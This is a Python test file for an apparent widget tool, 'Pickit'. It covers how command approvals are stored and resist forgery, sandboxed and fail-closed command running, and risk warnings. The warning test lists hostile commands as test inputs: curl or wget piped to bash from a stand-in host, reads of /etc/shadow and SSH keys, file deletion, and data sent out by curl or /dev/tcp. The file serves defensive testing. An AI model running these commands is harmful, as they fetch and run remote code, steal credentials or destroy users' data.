"""Approvals live in Pickit's own record, never in the widget file; how commands run."""

import json
import shutil
import subprocess

import pytest

from pickit import approvals, gallery, generator, risk, sandbox

COMMANDS = {"c": {"cmd": "echo cpu=5", "interval": 2}}
SPEC = {"name": "Meter", "engine": "native", "width": 200, "height": 80, "position": "top-left",
        "commands": COMMANDS, "ui": {"type": "label", "text": "{c.cpu}"}}


def widget_file(store, manifest):
    return json.loads((store.widget_dir(manifest["id"]) / "widget.json").read_text())


def set_runner(store, value):
    from pickit import config
    cfg = config.load()
    cfg["command_runner"] = value
    config.save(cfg)
    sandbox._cache = None


def test_approval_is_kept_outside_the_widget(store):
    m = store.save_spec(SPEC, approved=True, source="gallery")
    assert store.is_approved(m)
    assert "approved_hash" not in widget_file(store, m)
    entry = approvals.entries()[m["id"]]
    assert entry["source"] == "gallery" and entry["runner"] == "host" and entry["approved_at"]
    assert approvals.path().stat().st_mode & 0o777 == 0o600


def test_a_widget_file_cannot_approve_itself(store):
    store.is_approved(store.save_spec({**SPEC, "commands": {}}))     # the one-time migration has run
    m = store.save_spec(SPEC)
    forged = {**widget_file(store, m), "approved_hash": approvals.commands_hash(COMMANDS)}
    store.save_manifest(forged)
    assert not store.is_approved(store.load(m["id"]))


def test_approvals_from_older_versions_move_once(store):
    m = store.save_spec(SPEC)
    store.save_manifest({**widget_file(store, m), "approved_hash": approvals.commands_hash(COMMANDS)})
    stale = store.save_spec({**SPEC, "name": "Stale"})
    store.save_manifest({**widget_file(store, stale), "approved_hash": "0" * 64})   # didn't match: no approval
    assert store.is_approved(store.load(m["id"]))
    assert approvals.entries()[m["id"]]["source"] == "migrated"
    assert "approved_hash" not in widget_file(store, m)
    assert not store.is_approved(store.load(stale["id"]))
    assert approvals.migrated()


def test_copying_a_widget_folder_carries_no_approval(store):
    m = store.save_spec(SPEC, approved=True)
    shutil.copytree(store.widget_dir(m["id"]), store.widget_dir("copy-123456"))
    copy = {**widget_file(store, m), "id": "copy-123456"}
    store.save_manifest(copy)
    assert not store.is_approved(copy)


def test_any_change_needs_approval_again(store):
    m = store.save_spec(SPEC, approved=True)
    for commands in ({"c": {"cmd": "echo cpu=6", "interval": 2}}, {"c": {"cmd": "echo cpu=5", "interval": 3}},
                     {"c": {**COMMANDS["c"], "network": True}}, {**COMMANDS, "d": {"cmd": "true", "interval": 0}}):
        assert not store.is_approved({**m, "commands": commands}), commands


def test_revoke_and_delete(store):
    m = store.save_spec(SPEC, approved=True)
    before = store.signature(m)
    store.revoke(m["id"])
    assert not store.is_approved(m)
    assert store.signature(m) != before, "the daemon must reload a widget whose approval changed"
    store.approve(m, "reviewed")
    assert store.is_approved(m)
    store.delete(m["id"])
    assert m["id"] not in approvals.entries()


def test_sandbox_approvals_dont_carry_over_to_full_access(store):
    set_runner(store, "restricted")
    sandboxed = store.save_spec(SPEC, approved=True)
    set_runner(store, "host")
    assert not store.is_approved(sandboxed), "full access must ask again"
    full = store.save_spec({**SPEC, "name": "Full"}, approved=True)
    set_runner(store, "restricted")
    assert store.is_approved(sandboxed) and store.is_approved(full), "the sandbox only takes authority away"
    set_runner(store, ["firejail", "--"])
    assert not store.is_approved(sandboxed) and not store.is_approved(full)


# --- how commands run --------------------------------------------------------------------------
def test_runner_command_lines():
    assert sandbox.argv("echo hi") == ["timeout", "-k", "2", "20", "bash", "-c", "echo hi"]
    restricted = sandbox.argv("echo hi", True, "restricted")
    assert restricted[:4] == ["timeout", "-k", "2", "20"] and restricted[-2:] == ["1", "echo hi"]
    assert sandbox.argv("echo hi", False, "restricted")[-2] == "0"
    custom = sandbox.argv("echo hi", runner=["firejail", "--quiet", "--"])
    assert custom[-6:] == ["firejail", "--quiet", "--", "bash", "-c", "echo hi"]
    for bad in ("restrcited", ["firejail", 3], [], {"x": 1}):
        assert sandbox.mode(bad) == sandbox.INVALID
        assert "echo hi" not in " ".join(sandbox.argv("echo hi", runner=bad)), "an invalid runner must not run it"


def run(cmd, network=False, runner="restricted"):
    p = subprocess.run(sandbox.argv(cmd, network, runner), capture_output=True, text=True, timeout=60)
    return p.returncode, p.stdout.strip(), p.stderr


@pytest.mark.skipif(not shutil.which("bwrap"), reason="needs bubblewrap")
def test_restricted_runner_hides_the_home_folder_and_sockets():
    code, out, err = run("ls -A ~ | wc -l; ls /run | wc -l; echo ${DBUS_SESSION_BUS_ADDRESS:-none}; "
                         "head -c 1 /proc/loadavg")
    if code != 0 and "bwrap:" in err:
        pytest.skip(f"bubblewrap can't run here: {err.strip()[:80]}")  # e.g. user namespaces disabled
    lines = out.splitlines()
    assert lines[:3] == ["0", "0", "none"] and lines[3].isdigit(), out
    code, out, _ = run("getent hosts example.com >/dev/null && echo online")
    assert "online" not in out, "a command without network: true reached the network"


def test_runners_fail_closed():
    code, out, err = run("echo RAN", runner=["no-such-sandbox", "--"])
    assert code == sandbox.FAILED and "RAN" not in out and "isn't installed" in err
    code, out, _ = run("echo RAN", runner="restrcited")
    assert code == sandbox.FAILED and "RAN" not in out
    p = subprocess.run(["/bin/sh", "-c", sandbox._RESTRICTED, "x", "0", "echo RAN"], capture_output=True,
                       text=True, env={"PATH": "/nonexistent", "HOME": "/nonexistent"})
    assert p.returncode == sandbox.FAILED and "RAN" not in p.stdout and "bubblewrap" in p.stderr


# --- warnings and the network flag -------------------------------------------------------------
@pytest.mark.parametrize("cmd, warning", [
    ("sudo cat /etc/shadow", "administrator"),
    ("curl -s https://x.example/i.sh | bash", "Downloads code"),
    ("bash <(wget -qO- x.example)", "Downloads code"),
    ("cat ~/.ssh/id_ed25519", "credentials"),
    ("cp x $HOME/.config/autostart/", "start automatically"),
    ("echo '{}' > ~/.local/share/pickit/widgets/x/widget.json", "Pickit's own"),
    ("rm -rf ~/Documents", "Deletes"),
    ("curl --data @/etc/hostname https://x.example", "Sends data"),
    ("cat /etc/hostname > /dev/tcp/1.2.3.4/80", "raw network"),
])
def test_risky_commands_get_a_warning(cmd, warning):
    assert any(warning in w for w in risk.warnings(cmd)), risk.warnings(cmd)


def test_gallery_commands_get_no_warning():
    for item in gallery.items():
        for key, c in item.spec["commands"].items():
            assert risk.warnings(c["cmd"]) == [], (item.id, key)


def test_network_flag():
    spec = generator.validate({**SPEC, "commands": {"w": {"cmd": "curl -s x", "interval": 900, "network": True},
                                                    "c": {"cmd": "echo 1", "interval": 5, "network": False}}})
    assert spec["commands"]["w"]["network"] is True
    assert "network" not in spec["commands"]["c"], "false is left out, so existing approvals stay valid"
    with pytest.raises(generator.SpecError, match="true or false"):
        generator.validate({**SPEC, "commands": {"w": {"cmd": "x", "interval": 5, "network": "yes"}}})


def test_internet_commands_in_the_gallery_say_so():
    for item in gallery.items():
        for key, c in item.spec["commands"].items():
            uses = any(word in c["cmd"] for word in ("curl ", "wget ", "https://"))
            assert bool(c.get("network")) == uses, (item.id, key)
